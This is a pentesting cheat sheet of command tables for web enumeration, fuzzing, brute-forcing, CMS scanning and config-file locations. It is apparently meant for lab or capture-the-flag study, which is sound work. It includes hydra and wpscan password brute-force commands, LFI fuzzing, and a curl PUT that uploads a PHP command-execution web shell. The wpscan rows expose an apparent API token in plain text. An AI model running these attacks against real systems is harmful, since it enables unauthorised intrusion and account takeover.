# HTTP
## General
### Manual
1. View page source

### Scans
| Info | Command |
|:-----|:--------|
| Nikto standard scan    | `nikto -host=http://$ip`                                              |
| Whatweb standard scan  | `whatweb --color=never --no-errors -a 3 -v http://$ip 2>&1`           |
| nmap web scan          | `nmap --reason -Pn -sV -p 80 --script="banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" $ip` |

### Inspecting Pages
| Info | Command |
|:-----|:--------|
| Download webpages      | `mkdir web; cd web; wget -r -nd http://$ip; cd ../` |
| Check for pass string  |  `grep --color=auto -R 'pass' web/` |
| Search for comments  | `grep --color=auto -R -F '<!-' web/` |
| Check robots.txt     | `curl http://$ip/robots.txt` |
| Check robots.txt HTTPS | `curl -k  https://$ip/robots.txt` |

### Fuzz
| Info | Command |
|:-----|:--------|
| Find index extension | `ffuf -u http://$ip/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt` |
| File extension check | `ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.txt` |
| Directory check | `ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` |
| Directory check (hide 403) | `ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 403` |
| Directory check (show only 200) | `ffuf -u http://$ip/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -mc 200` |
| Fuzz parameters | `ffuf -u 'http://$ip/sqli-labs/Less-1/?FUZZ=1' -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fw 39` |
| Test parameters with integers | `for i in {0..255}; do echo $i; done | ffuf -u 'http://$ip/sqli-labs/Less-1/?id=FUZZ' -c -w - -fw 33` |
| Post password bruteforce | `ffuf -u http://$ip/sqli-labs/Less-11/ -c -w /usr/share/seclists/Passwords/Leaked-Databases/hak5.txt -X POST -d 'uname=Dummy&passwd=FUZZ&submit=Submit' -fs 1435 -H 'Content-Type: application/x-www-form-urlencoded' ` |
| Subdomain check | `ffuf -u http://FUZZ.mydomain.com -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` |
| Use proxy | `ffuf -u http://$ip/ -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -x http://127.0.0.1:8080` |
| Use proxy (matches only) |`ffuf -u http://$ip/ -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -replay-proxy http://127.0.0.1:8080` |


### Directory Search
| Info | Command |
|:-----|:--------|
| feroxbuster (good) | `feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 60 --url http://$domain/ -x txt,php,html -C 403,301,302` | 
| feroxbuster (best) | `feroxbuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 60 --url http://$domain/ -x txt,php,html -C 403,301,302` |
| ffuf medium | `ffuf -u http://$ip/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt` |
| ffuf big | `ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` |
| gobuster (quick)    | `gobuster dir -u http://$ip/ -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster.txt -e -k`|
| gobuster (good)    | `gobuster dir -u http://$ip -e -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 80`|
| gobuster (best)    | `gobuster dir -u http://$ip -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80`|
| dirbuster (good) | `dirbuster -l /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 40 -u http://$ip` |
| dirbuster (best) | `dirbuster -l /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 40 -u http://$ip` |
| wfuzz | `wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -w /usr/share/wfuzz/wordlist/general/extensions_common.txt -c --hc 404 http://$ip:8080/FUZZFUZ2Z` |
| Using response size filter | `wfuzz -w /usr/share/dirb/wordlists/big.txt --hh 2123 -c http://$ip:80/FUZZ` |

### Subdomain Check
| Info | Command |
|:-----|:--------|
| Check for subdomains | `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.$domain" -u http://$domain/ -fs 85`
| Check for subdomains | `gobuster vhost -u $domain -w /usr/share/dirb/wordlists/big.txt` |
| Check for subdomains | `gobuster vhost -u $domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt` |
| Check for subdomains | `wfuzz --hw 1922 -u http://$domain -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt` |
| wfuzz| `wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://$domain/" -H "Host: FUZZ.$domain" --hl 107` |

### LFI Check
| Info | Command |
|:-----|:--------|
| wfuzz | Find response size | `wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -u http://$ip/thankyou.php?FUZZ=FUZ2Z` |
| wfuzz | Add standard response size | `wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -u http://$ip/thankyou.php?FUZZ=FUZ2Z --hh 851` |

### Bruteforce
| Info | Command |
|:-----|:--------|
| Hydra http-get login | `hydra -l admin -P /usr/share/wordlists/rockyou.txt -f $ip http-get /inferno/ -t 64 -V` |
| Hydra http-post login | `hydra -V -l $user -P /usr/share/wordlists/rockyou.txt $ip http-post-form "/login/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed"` |
| Hydra http-post json | `hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-post://$ip/api/login/:{"username"\:"^USER^","password"\:"^PASS^"}:H=Content-Type\:application/json:F=ERROR'` |


### Curl
| Info | Command |
|:-----|:--------|
| Get header | `curl -i $ip` |
| Get all info | `curl -i -L $ip` |
| Check for title and links | `curl $ip -s -L \| grep "title\|href" \| sed -e 's/^[[:space:]]*//'` |
| Look at page text only | `curl $ip -s -L \| html2text -width '99' \| uniq |`
| Check if it is possible to upload | `curl -v -X OPTIONS http://$ip/` |
| Upload shell if possible | `curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://$ip/test/shell.php` |

## Applications
### CMS Configuration Files
| Software | Location |
|:-----|:--------|
| WordPress | `/var/www/html/wp-config.php` |
| Joomla | `/var/www/configuration.php` |
| Dolphin CMS | `/var/www/html/inc/header.inc.php` |
| Drupal | `/var/www/html/sites/default/settings.php`
| Mambo | `/var/www/configuration.php` |
| PHPNuke | `/var/www/config.php` |
| PHPbb | `/var/www/config.php` |

### Scan Utilities
| Scan Type        | Description               | Command                                                               |
| -----------------|:--------------------------------:|:---------------------------------------------------------------|
| Drupal           | Generic Drupal scan      | `droopescan scan drupal -u $ip:1898` |
| Joomla           | joomscan | `perl /opt/joomscan/joomscan.pl -u $ip` |
| Joomla           | joomscan enumerate components | `joomscan -u  http://$ip --enumerate-components` |
| Magento          | Magescan | `php magescan.phar scan:all http://$ip` |
| Wordpress        | Check plugin folder manually | `curl http://$ip/wp-content/plugins/` |
| Wordpress        | Find Username Scan         | `wpscan --url http://$ip/wordpress --enumerate u` |
| Wordpress        | Bruteforce Single User | `wpscan --url http://$ip/wordpress -U $user -P /usr/share/wordlists/rockyou.txt` |
| Wordpress        | Bruteforce Multiple Users | `wpscan --url http://$ip/wordpress -U users.txt -P /usr/share/wordlists/rockyou.txt` |
| Wordpress        | General Scan | `wpscan --url http://$ip/ --enumerate ap,at,tt,cb,dbe,u,m --disable-tls-checks --api-token eKpnMWH29Yd1KDYgZdvUodzwaUPhCwqvs6oabDSlTpE --ignore-main-redirect` |
| Wordpress        | Agressive Scan | `wpscan --url http://$ip/ --enumerate ap --disable-tls-checks --api-token eKpnMWH29Yd1KDYgZdvUodzwaUPhCwqvs6oabDSlTpE --ignore-main-redirect --plugins-detection aggressive` |

### Version Info
| Application | Location |
|:------------|:--------|
| Drupal | Check for CHANGELOG.txt |
| Joomla | /administrator/manifests/files/joomla.xml |
| Strapi Version | `curl http://$domain/admin/strapiVersion` |